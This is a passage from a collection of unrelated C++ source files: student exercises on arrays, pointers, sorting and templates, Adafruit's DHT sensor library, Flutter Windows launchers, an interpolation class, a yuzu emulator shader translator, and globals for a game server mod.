// Output the sequence\n        }\n        cout << endl;\n    }\n\n    // Initialize the minimum positive value with a neutral value\n    int minPositive = 0;\n    bool foundPositive = false; // Flag to check if a positive value was found\n\n    // Find the minimum positive value\n    for (int i = 0; i < m; ++i) {\n        for (int j = 0; j < A[i].size(); ++j) {\n            if (A[i][j] > 0 && (!foundPositive || A[i][j] < minPositive)) {\n                minPositive = A[i][j]; // Update the minimum positive value\n                foundPositive = true; // Positive value found\n            }\n        }\n    }\n\n    // Output the result\n    if (foundPositive) {\n        cout << \"Minimum positive value: \" << minPositive << endl;\n    }\n    else {\n        cout << \"No positive values found.\" << endl;\n    }\n\n    return 0;\n}",
    "\ufeff//#define _CRT_SECURE_NO_WARNINGS\n#include<iostream>\n#include<iomanip>\n#include<Windows.h>\n#include<conio.h>\n\n#include\"myFunc.h\"\n#include\"strFunc.h\"\n#include\"MyStruct.h\"\n\nusing namespace std;\n\n\nenum DIRECTION\n{\n\tUP = 72, DOWN = 80, LEFT = 75, RIGHT = 77, ESC = 27\n};\n\n\n\nint main()\n{\n\tSetConsoleCP(1251);\n\tSetConsoleOutputCP(1251);\n\tcout.setf(ios::boolalpha);\n\tSetColor(White, Black);\n\tsystem(\"cls\");\n\tsrand(time(0));\n\n\n\t///// 13.09.2024 //////\n\n\t//=============================================================================\n\n\n\t/*Point p1;\n\tp1.x = 10;\n\tp1.y = 20;\n\tp1.name = 'A';\n\n\tPoint p2 = { 'B', 3, 6 };\n\n\tprintPoint(p1);\n\n\tPoint* p3 = new Point;\n\tp3->name = 'C';\n\tp3->x = 5;\n\tp3->y = 2;\n\n\tprintPoint(*p3);\n\n\tPoint p4[] = { 'D', 5, 7, 'F', 4, 6 };\n\tfor (size_t i = 0; i < 2; i++)\n\t{\n\t\tprintPoint(p4[i]);\n\t}*/\n\n\t/*Point p[5];\n\tsetArray(p, 5);\n\tfor (size_t i = 0; i < 5; i++)\n\t{\n\t\tprintPoint(p[i]);\n\t}\n\n\tPoint p1 = maxLength(p, 5);\n\tprintPoint(p1);*/\n\n\n\t/*Date d;\n\td.set();\n\td.print();\n\n\n\tHuman h;\n\th.birthDay.set();\n\th.birthDay.print();*/\n\n\n\tCar car;\n\tcar.Move();\n\tcar.Beep();\n\n\n\n\n\t///// 09.09.2024 //////\n\n\t//=============================================================================\n\n\t/*char str[] = { 'H', 'e', 'l', 'l', 'o', '\\0'};\n\n\tchar str2[] = \"Hello C++\";\n\n\tint arr[] = { 1,2,3 };\n\n\tcout << arr << endl;\n\n\tcout << str << endl;\n\n\tcout << lenstr(str) << endl;\n\n\tcout << strlen(str) << endl;*/\n\n\t//char* buff = new char[80];\n\n\t//cin.getline(buff, 80);\n\t////cout << buff << endl;\n\n\t//char* dStr = new char[strlen(buff) + 1];\n\t//strcpy_s(dStr, strlen(buff)+1, buff);\n\n\t//cout << dStr << endl;\n\n\t//cout << replaceSymbol(dStr, 'a', '+') << endl;\n\n\n\t//char str1[80] = \"erewrtertwertwertwert\";\n\t//char str2[80];\n\t//cin.getline(str1, 80);\n\t//cin.getline(str2, 80);\n\n\t//strcpy_s(str2, strlen(str1) + 1, str1);\n\t//strncpy_s(str2, strlen(str1) + 1, str1, 5);\n\t\n\t//strcat_s(str1, 80, str2);\n\t//strncat_s(str1, 80, str2, 5);\n\n\t//cout << strcmp(str1, str2) << endl;\n\t//cout << strncmp(str1, str2, 5) << endl;\n\t//cout << _stricmp(str1, str2) << endl;\n\t//cout << _strnicmp(str1, str2, 5) << endl;\n\n\t/*char* t = strrchr(str1, 'a');\n\tif(t != nullptr)\n\t\tcout << t << endl;*/\n\n\n\t/*char* t = strstr(str1, \"ma\");\n\tif (t != nullptr)\n\t\tcout << t << endl;*/\n\n\t//_strlwr_s(str1, 80);\n\t//_strupr_s(str1, 80);\n\n\t/*int a1 = atoi(str1);\n\tlong a2 = atol(str1);\n\tdouble a3 = atof(str1);\n\n\tcout << a3 << endl;*/\n\n\t//_itoa_s(34645646547, str1, 36);\n\n\t//cout << str1 << endl;\n\n\n\t\n\n\t//cout << kolslov(str1) << endl;\n\n\t// ertewr   ewrtre wertewr  \n\n\t///// 06.09.2024 //////\n\n\t//=============================================================================\n\n\n\t/*int size;\n\tcin >> size;\n\n\tint* p = new int[size];\n\tsetArray(p, size, 0, 999);\n\tprintArray(p, size);\n\tbubbleSort(p, size, FromSumNumber);\n\tprintArray(p, size);*/\n\n\n\t/*int bullets[3] = { 50, 50, 50 };\n\tvoid(*shot)(int*);\n\t\n\n\twhile (true)\n\t{\n\t\tshot = logic(bullets);\n\t\tshot(bullets);\n\t\tSleep(1000);\n\t}*/\n\t\n\n\n\t// type (*name)(param);\n\n\t//void (*message)();\n\t//message = hello;\n\t//message();\n\t//message = goodbye;\n\t//message();\n\n\t////int (*operation)(int, int) = sum;\n\t//int (*operation[])(int, int) = {sum, diff, mult, division, pow_};\n\t//int a, b;\n\t//cin >> a >> b;\n\t//cout << \"1+, 2-, 3-*, 4/, 5^  : \";\n\t//int choice;\n\t//cin >> choice;\n\t//cout << operation[choice-1](a, b) << endl;\n\n\n\n\n\n\t/*int row = 3, col = 4;\n\n\tint** p = nullptr;\n\tcreateArr2D(p, row, col);\n\tsetArr2D(p, row, col);\n\tprintArr2D(p, row, col);*/\n\n\n\t//swap(p[0], p[row - 1]);\n\n\t/*for (size_t i = 0; i < col; i++)\n\t{\n\t\tswap(p[0][i], p[row - 1][i]);\n\t}*/\n\n\n\t/*starLine(20);\n\n\tint* b = new int[row];\n\tsetArray(b, row);\n\tprintArray(b, row);\n\tstarLine(20);\n\n\taddColummArray2D(p, row, col, b);\n\t\n\tprintArr2D(p, row, col);*/\n\n\t///// 02.09.2024 //////\n\n\t//=============================================================================\n\n\n\t/*int a = 5;\n\tint* p1 = &a;\n\tint** p2 = &p1;\n\n\tcout << p1 << endl;\n\tcout << p2 << endl;\n\n\tcout << *p2 << endl;\n\tcout << **p2 << endl;*/\n\n\t//**p\n\t//*(*(p+i)+j) = p[i][j]\n\n\t//int row = 3, col = 4;\n\n\t//int** p = nullptr;\n\t//createArr2D(p, row, col);\n\t//setArr2D(p, row, col);\n\t//printArr2D(p, row, col);\n\t//\n\n\t////int* b = new int[col];\n\t////setArray(b, col+1);\n\n\t//cout << endl;\n\t//addRowArr2D(p, row, col);\n\t//printArr2D(p, row, col);\n\n\t//deleteArr2D(p, row);\n\n\n\t///// 01.07.2024 //////\n\n\t//=============================================================================\n\n\t//int a = 5;\n\t//int b = 8;\n\t//const int* pa1 = &a; // \u043f\u043e\u043a\u0430\u0436\u0447\u0438\u043a \u043d\u0430 \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u043d\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f\n\t////a = 99;\n\t////*pa1 = 99;\n\t//pa1 = &b;\n\t////*pa1 = 99;\n\n\n\t//int* const pa2 = &a; // \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u043d\u0438\u0439 \u043f\u043e\u043a\u0430\u0436\u0447\u0438\u043a\n\t//*pa2 = 99;\n\t////pa2 = &b;\n\n\t//const int* const pa3 = &a; // \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u043d\u0438\u0439 \u043f\u043e\u043a\u0430\u0436\u0447\u0438\u043a \u043d\u0430 \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u043d\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f\n\t////*pa3 = 99;\n\t////pa3 = &b;\n\n\t//swap(a, b);\n\n\t//func(&a);\n\t//cout << a << endl;\n\n\t\n\n\t///// 24.06.2024 //////\n\n\t//=============================================================================\n\n\t/*int size;\n\tcout << \"Size: \";\n\tcin >> size;\n\n\tint* p = new int[size];\n\tsetArray(p, size);\n\tprintArray",
    "/* DHT library\n\nMIT license\nwritten by Adafruit Industries\n*/\n\n#include \"DHT.h\"\n\n#define MIN_INTERVAL 2000\n\nDHT::DHT(uint8_t pin, uint8_t type, uint8_t count) {\n  _pin = pin;\n  _type = type;\n  _bit = digitalPinToBitMask(pin);\n  _port = digitalPinToPort(pin);\n  _maxcycles = microsecondsToClockCycles(1000);  // 1 millisecond timeout for\n                                                 // reading pulses from DHT sensor.\n  // Note that count is now ignored as the DHT reading algorithm adjusts itself\n  // basd on the speed of the processor.\n}\n\nvoid DHT::begin(void) {\n  // set up the pins!\n  pinMode(_pin, INPUT_PULLUP);\n  // Using this value makes sure that millis() - lastreadtime will be\n  // >= MIN_INTERVAL right away. Note that this assignment wraps around,\n  // but so will the subtraction.\n  _lastreadtime = -MIN_INTERVAL;\n  DEBUG_PRINT(\"Max clock cycles: \"); DEBUG_PRINTLN(_maxcycles, DEC);\n}\n\n//boolean S == Scale.  True == Fahrenheit; False == Celcius\nfloat DHT::readTemperature(bool S, bool force) {\n  float f = NAN;\n\n  if (read(force)) {\n    switch (_type) {\n    case DHT11:\n      f = data[2];\n      if(S) {\n        f = convertCtoF(f);\n      }\n      break;\n    case DHT22:\n    case DHT21:\n      f = data[2] & 0x7F;\n      f *= 256;\n      f += data[3];\n      f *= 0.1;\n      if (data[2] & 0x80) {\n        f *= -1;\n      }\n      if(S) {\n        f = convertCtoF(f);\n      }\n      break;\n    }\n  }\n  return f;\n}\n\nfloat DHT::convertCtoF(float c) {\n  return c * 1.8 + 32;\n}\n\nfloat DHT::convertFtoC(float f) {\n  return (f - 32) * 0.55555;\n}\n\nfloat DHT::readHumidity(bool force) {\n  float f = NAN;\n  if (read()) {\n    switch (_type) {\n    case DHT11:\n      f = data[0];\n      break;\n    case DHT22:\n    case DHT21:\n      f = data[0];\n      f *= 256;\n      f += data[1];\n      f *= 0.1;\n      break;\n    }\n  }\n  return f;\n}\n\n//boolean isFahrenheit: True == Fahrenheit; False == Celcius\nfloat DHT::computeHeatIndex(float temperature, float percentHumidity, bool isFahrenheit) {\n  // Using both Rothfusz and Steadman's equations\n  // http://www.wpc.ncep.noaa.gov/html/heatindex_equation.shtml\n  float hi;\n\n  if (!isFahrenheit)\n    temperature = convertCtoF(temperature);\n\n  hi = 0.5 * (temperature + 61.0 + ((temperature - 68.0) * 1.2) + (percentHumidity * 0.094)); \n\n  if (hi > 79) {\n    hi = -42.379 +\n             2.04901523 * temperature +\n            10.14333127 * percentHumidity +\n            -0.22475541 * temperature*percentHumidity +\n            -0.00683783 * pow(temperature, 2) +\n            -0.05481717 * pow(percentHumidity, 2) +\n             0.00122874 * pow(temperature, 2) * percentHumidity +\n             0.00085282 * temperature*pow(percentHumidity, 2) +\n            -0.00000199 * pow(temperature, 2) * pow(percentHumidity, 2);\n\n    if((percentHumidity < 13) && (temperature >= 80.0) && (temperature <= 112.0))\n      hi -= ((13.0 - percentHumidity) * 0.25) * sqrt((17.0 - abs(temperature - 95.0)) * 0.05882);\n\n    else if((percentHumidity > 85.0) && (temperature >= 80.0) && (temperature <= 87.0))\n      hi += ((percentHumidity - 85.0) * 0.1) * ((87.0 - temperature) * 0.2);\n  }\n\n  return isFahrenheit ? hi : convertFtoC(hi);\n}\n\nboolean DHT::read(bool force) {\n  // Check if sensor was read less than two seconds ago and return early\n  // to use last reading.\n  uint32_t currenttime = millis();\n  if (!force && ((currenttime - _lastreadtime) < 2000)) {\n    return _lastresult; // return last correct measurement\n  }\n  _lastreadtime = currenttime;\n\n  // Reset 40 bits of received data to zero.\n  data[0] = data[1] = data[2] = data[3] = data[4] = 0;\n\n  // Send start signal.  See DHT datasheet for full signal diagram:\n  //   http://www.adafruit.com/datasheets/Digital%20humidity%20and%20temperature%20sensor%20AM2302.pdf\n\n  // Go into high impedence state to let pull-up raise data line level and\n  // start the reading process.\n  digitalWrite(_pin, HIGH);\n  delay(250);\n\n  // First set data line low for 20 milliseconds.\n  pinMode(_pin, OUTPUT);\n  digitalWrite(_pin, LOW);\n  delay(20);\n\n  uint32_t cycles[80];\n  {\n    // Turn off interrupts temporarily because the next sections are timing critical\n    // and we don't want any interruptions.\n    InterruptLock lock;\n\n    // End the start signal by setting data line high for 40 microseconds.\n    digitalWrite(_pin, HIGH);\n    delayMicroseconds(40);\n\n    // Now start reading the data line to get the value from the DHT sensor.\n    pinMode(_pin, INPUT_PULLUP);\n    delayMicroseconds(10);  // Delay a bit to let sensor pull data line low.\n\n    // First expect a low signal for ~80 microseconds followed by a high signal\n    // for ~80 microseconds again.\n    if (expectPulse(LOW) == 0) {\n      DEBUG_PRINTLN(F(\"Timeout waiting for start signal low pulse.\"));\n      _lastresult = false;\n      return _lastresult;\n    }\n    if (expectPulse(HIGH) == 0) {\n      DEBUG_PRINTLN(F(\"Timeout waiting for start signal high pulse.\"));\n      _lastresult = false;\n      return _lastresult;\n    }\n\n    // Now read the 40 bits sent by the sensor",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nvoid bubblesort(int arr[])\r\n{\r\n    int rounds=0;\r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        rounds++;\r\n        int flag = false;\r\n        for (int j = 0; j < 5 - i - 1; j++)\r\n        {\r\n            if (arr[j] > arr[j + 1])\r\n            {\r\n                flag = true;\r\n                int temp = arr[j];\r\n                arr[j] = arr[j + 1];\r\n                arr[j + 1] = temp;\r\n            }\r\n        }\r\n        if(flag == false){\r\n            break;\r\n        }\r\n    }\r\n    cout<<\"No.of rounds:\"<<rounds<<endl;\r\n}\r\n\r\nint main()\r\n{\r\n    int myarr[5];\r\n    cout << \"Enter an integers in random way : \";\r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        cin >> myarr[i];\r\n    }\r\n\r\n    cout << \"unsorted array : \" << endl;\r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        cout << myarr[i] << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    bubblesort(myarr);\r\n\r\n    cout << \"sorted array : \" << endl;\r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        cout << myarr[i] << \" \";\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"project_clean_architecture\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"exampleproject\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#pragma once\n\n#include \"Interpolate1d.h\"\n#include <stdexcept>\n\n\n\ninterp1dlin::interp1dlin(data_array xin, data_array yin) {\n    xdata = xin;\n    ydata = yin;\n\n    if (xdata.size() != ydata.size()) {\n        throw std::invalid_argument(\"Sizes or vectors xin and yin are not equal...\");\n    };\n\n    bool flag = false;\n\n    for (int i = 1; i < xdata.size(); i++) {\n        if (xdata[i] <= xdata[i - 1]) {\n            flag = true;\n        };\n    };\n\n    if (flag) {\n        throw std::invalid_argument(\"X vector is not in ascending sequence...\");\n    }\n\n};\n\n\ndouble interp1dlin::operator()(double xi){\n    \n    //Keep extremes when out of bounds\n    if (xi <= xdata[0]) {\n        return ydata[0];\n    };\n\n    if (xi >= xdata[xdata.size() - 1]) {\n        return ydata[xdata.size() - 1];\n    };\n\n    double val,a,b;\n    for (int i = 1; i < xdata.size(); i++) {\n        if (xi < xdata[i]) {\n\n            a = (ydata[i] - ydata[i - 1]) / (xdata[i] - xdata[i - 1]);\n            b = ydata[i] - a * xdata[i];\n            val = a * xi + b;\n\n            return val;\n        };\n    };\n};\n",
    "\ufeff\n\n#include <iostream>\n#include<vector>\n\n\n\ntemplate<class T>\nT MaxVal(T* arr, int size) {\n\tT temp = arr[0];\n\tfor (int i{1}; i < size; ++i) {\n\t\tif (temp < arr[i])\n\t\t\ttemp = arr[i];\n\t}\n\treturn temp;\n}\n\ntemplate<class T>\nT MinVal(T* arr, int size) {\n\tT temp = arr[0];\n\tfor (int i{ 1 }; i < size; ++i) {\n\t\tif (temp > arr[i])\n\t\t\ttemp = arr[i];\n\t}\n\treturn temp;\n}\n\ntemplate<class T>\nT MaxVal(std::vector<T> vec) {\n\tT temp = vec[0];\n\tfor (int i{}; i < vec.size();++i) {\n\t\tif (temp < vec[i])\n\t\t\ttemp = vec[i];\n\t}\n\treturn temp;\n}\n\ntemplate<class T>\nT MinVal(std::vector<T> vec) {\n\tT temp = vec[0];\n\tfor (int i{}; i < vec.size(); ++i) {\n\t\tif (temp > vec[i])\n\t\t\ttemp = vec[i];\n\t}\n\treturn temp;\n}\n\ntemplate <class T>\nvoid MySort(T* arr, int size) {\n\tfor (int i{}; i < size; ++i) {\n\t\tfor (int j{ i + 1 }; j < size; ++j) {\n\t\t\tif (arr[i] > arr[j])\n\t\t\t\tstd::swap(arr[i], arr[j]);\n\t\t}\n\t}\n}\n\n\n\n\ntemplate <class T>\nvoid MySort(std::vector<T>& vec) {\n\tfor (int i{}; i < vec.size(); ++i) {\n\t\tfor (int j{i+1}; j < vec.size(); ++j) {\n\t\t\tif (vec[i] > vec[j])\n\t\t\t\tstd::swap(vec[i], vec[j]);\n\t\t}\n\t}\n}\n\n\ntemplate <class T>\nint MyBinarySearch(T* arr, int size, const T& key) {\n\tint left{};\n\tint right = size - 1;\n\n\twhile (left<=right)\n\t{\n\t\tint mid = left + (right - left) / 2;\n\t\tleft + (right - left) / 2;\n\t\tif (arr[mid] == key)\n\t\t\treturn mid;\n\n\t\telse if (arr[mid] < key)\n\t\t\tleft = mid + 1;\n\t\telse\n\t\t\tright = mid - 1;\n\n\t}\n}\n\ntemplate <class T> \nint MyBinarySearch(std::vector<T>&vec, const T& key) {\n\n\tint left{};\n\tint right = vec.size()-1;\n\n\twhile (left <= right) {\n\t\tint mid = left + (right - left) / 2;\n\t\tif (vec[mid] == key) \n\t\t\treturn mid; \n\t\t\n\t\telse if (vec[mid] < key) \n\t\t\tleft = mid + 1; \n\t\telse \n\t\t\tright = mid - 1; \n\t\t\n\t}\n}\n\ntemplate<class T>\nvoid NewValArr(std::vector<T>& vec, int index, const T& val) {\n\tif (index >= vec.size())\n\t\treturn;\n\tvec[index] = val;\n}\n\ntemplate<class T>\nvoid NewValArr(T* arr,int size , int index, const T& val) {\n\tif (index >=size)\n\t\treturn;\n\tarr[index] = val;\n}\n\ntemplate<class T>\nvoid print(T* arr, int size) {\n\tfor (int i{}; i < size; ++i) {\n\t\tstd::cout << arr[i] << \" \";\n\t}\n}\ntemplate<class T>\nvoid print(std::vector<T> vec) {\n\tfor (auto r : vec)\n\t\tstd::cout << r << \" \";\n}\n\nint main()\n{\n\tconst int SIZE = 10;\n\tstd::vector<int> vec{ 1,3,45,67,23,21,3,4,5,9 };\n\tint arr[SIZE]{ 1,3,45,67,23,21,3,4,5,9 };\n\n\n\tMySort(arr, SIZE);\n\tMySort(vec);\n\tstd::cout << std::endl;\n\tprint(arr, SIZE);\n\tstd::cout << std::endl;\n\tprint(vec);\n\tstd::cout << std::endl;\n\tstd::cout<<MyBinarySearch(arr, SIZE, 67)<<std::endl;\n\tstd::cout <<MyBinarySearch(vec, 21)<<std::endl;\n\n\tNewValArr(arr,SIZE, 3, 1234);\n\tNewValArr(vec, 3, 1234);\n\tprint(arr, SIZE);\n\tstd::cout << std::endl;\n\tprint(vec);\n\tstd::cout << std::endl;\n\tstd::cout << MinVal(arr, SIZE) << \" \" << MinVal(vec) << \" \" << MaxVal(arr, SIZE) << \" \" << MaxVal(vec);\n\n\treturn 0;\n}\n\n\n",
    "// SPDX-FileCopyrightText: Copyright 2021 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"common/bit_field.h\"\n#include \"common/common_types.h\"\n#include \"shader_recompiler/frontend/maxwell/translate/impl/common_funcs.h\"\n#include \"shader_recompiler/frontend/maxwell/translate/impl/impl.h\"\n\nnamespace Shader::Maxwell {\n\nvoid TranslatorVisitor::CSET(u64 insn) {\n    union {\n        u64 raw;\n        BitField<0, 8, IR::Reg> dest_reg;\n        BitField<8, 5, IR::FlowTest> cc_test;\n        BitField<39, 3, IR::Pred> bop_pred;\n        BitField<42, 1, u64> neg_bop_pred;\n        BitField<44, 1, u64> bf;\n        BitField<45, 2, BooleanOp> bop;\n        BitField<47, 1, u64> cc;\n    } const cset{insn};\n\n    const IR::U32 one_mask{ir.Imm32(-1)};\n    const IR::U32 fp_one{ir.Imm32(0x3f800000)};\n    const IR::U32 zero{ir.Imm32(0)};\n    const IR::U32 pass_result{cset.bf == 0 ? one_mask : fp_one};\n    const IR::U1 cc_test_result{ir.GetFlowTestResult(cset.cc_test)};\n    const IR::U1 bop_pred{ir.GetPred(cset.bop_pred, cset.neg_bop_pred != 0)};\n    const IR::U1 pred_result{PredicateCombine(ir, cc_test_result, bop_pred, cset.bop)};\n    const IR::U32 result{ir.Select(pred_result, pass_result, zero)};\n    X(cset.dest_reg, result);\n    if (cset.cc != 0) {\n        const IR::U1 is_zero{ir.IEqual(result, zero)};\n        SetZFlag(is_zero);\n        if (cset.bf != 0) {\n            ResetSFlag();\n        } else {\n            SetSFlag(ir.LogicalNot(is_zero));\n        }\n        ResetOFlag();\n        ResetCFlag();\n    }\n}\n\nvoid TranslatorVisitor::CSETP(u64 insn) {\n    union {\n        u64 raw;\n        BitField<0, 3, IR::Pred> dest_pred_b;\n        BitField<3, 3, IR::Pred> dest_pred_a;\n        BitField<8, 5, IR::FlowTest> cc_test;\n        BitField<39, 3, IR::Pred> bop_pred;\n        BitField<42, 1, u64> neg_bop_pred;\n        BitField<45, 2, BooleanOp> bop;\n    } const csetp{insn};\n\n    const BooleanOp bop{csetp.bop};\n    const IR::U1 bop_pred{ir.GetPred(csetp.bop_pred, csetp.neg_bop_pred != 0)};\n    const IR::U1 cc_test_result{ir.GetFlowTestResult(csetp.cc_test)};\n    const IR::U1 result_a{PredicateCombine(ir, cc_test_result, bop_pred, bop)};\n    const IR::U1 result_b{PredicateCombine(ir, ir.LogicalNot(cc_test_result), bop_pred, bop)};\n    ir.SetPred(csetp.dest_pred_a, result_a);\n    ir.SetPred(csetp.dest_pred_b, result_b);\n}\n\n} // namespace Shader::Maxwell\n",
    "#pragma once\n#include <iostream>\n\nvoid mainMenu()\n{\n    std::cout << \"Apasa 1 pentru a lucra cu stiva \\n\";\n    std::cout << \"Apasa 2 pentru a lucra cu matricea \\n\";\n    std::cout << \"Apasa 0 pentru a iesi \\n\";\n}\nvoid stackMenu()\n{\n    std::cout << \"Apasa 1 pentru a initializa stackul cu constructorul default \\n\";\n    std::cout << \"Apasa 2 pentru a initializa stackul cu constructorul cu parametri \\n\";\n    std::cout << \"Apasa 3 pentru a da push \\n\";\n    std::cout << \"Apasa 4 pentru a da pop \\n\";\n    std::cout << \"Apasa 5 pentru a verifica daca stackul e gol \\n\";\n    std::cout << \"Apasa 6 pentru a verifica daca stackul e plin \\n\";\n    std::cout << \"Apasa 7 pentru a printa stackul \\n\";\n    std::cout << \"Apasa 0 pentru a iesi \\n\";\n}\nvoid matrixMenu()\n{\n\n    std::cout << \"Apasa 1 pentru a initializa matricea 1 cu constructorul cu 1 parametru \\n\";\n    std::cout << \"Apasa 2 pentru a initializa matricea 2 cu constructorul cu 2 parametri \\n\";\n    std::cout << \"Apasa 3 pentru a seta marime noua a matrici 1 \\n\";\n    std::cout << \"Apasa 4 pentru a popula matricea dorita \\n\";\n    std::cout << \"Apasa 5 pentru a scadea matricea 1 din matricea 2 \\n\";\n    std::cout << \"Apasa 6 pentru a aduna matricea 2 la matricea 1 \\n\";\n    std::cout << \"Apasa 7 pentru a inmulti matricele intre ele \\n\";\n    std::cout << \"Apasa 8 pentru a printa matricele \\n\";\n    std::cout << \"Apasa 0 pentru a iesi \\n\";\n}",
    "#include \"globals.hpp\"\n\n#include \"../deadlock/classes.hpp\"\n\nCreateInterfaceFn g_pfnServerCreateInterface = nullptr;\nCreateInterfaceFn g_pfnEngineCreateInterface = nullptr;\n\nbool g_FriendlyFireEnabled = false;\nbool g_PrintStuff = false;\n\nHMODULE g_hServerModule = nullptr;\nAppSystemConnectFn g_pfnServerConfigConnect = nullptr;\n\nGameEventManager_InitFn g_pfnGameEventManager_InitOrig = nullptr;\nCTakeDamageInfo_CtorFn g_pfnCTakeDamageInfo_CtorOrig = nullptr;\n\nnamespace interfaces {\ndeadlock::CCitadelHeroManager *g_pCitadelHeroManager = nullptr;\ndeadlock::CCitadelHeroVDataManager *g_pCitadelHeroVDataManager = nullptr;\nCGameResourceService *g_pGameResourceService = nullptr;\nIGameEventManager2 *g_pGameEventManager2 = nullptr;\nISource2GameClients *g_pSource2GameClients = nullptr;\nISource2Server *g_pSource2Server = nullptr;\nICvar *&g_pCvar = ::g_pCVar;\n}; // namespace interfaces\n\nICvar *g_pCVar = nullptr;\n\nCGameEntitySystem *GameEntitySystem() {\n    return interfaces::g_pGameResourceService->GetGameEntitySystem();\n}\n"
]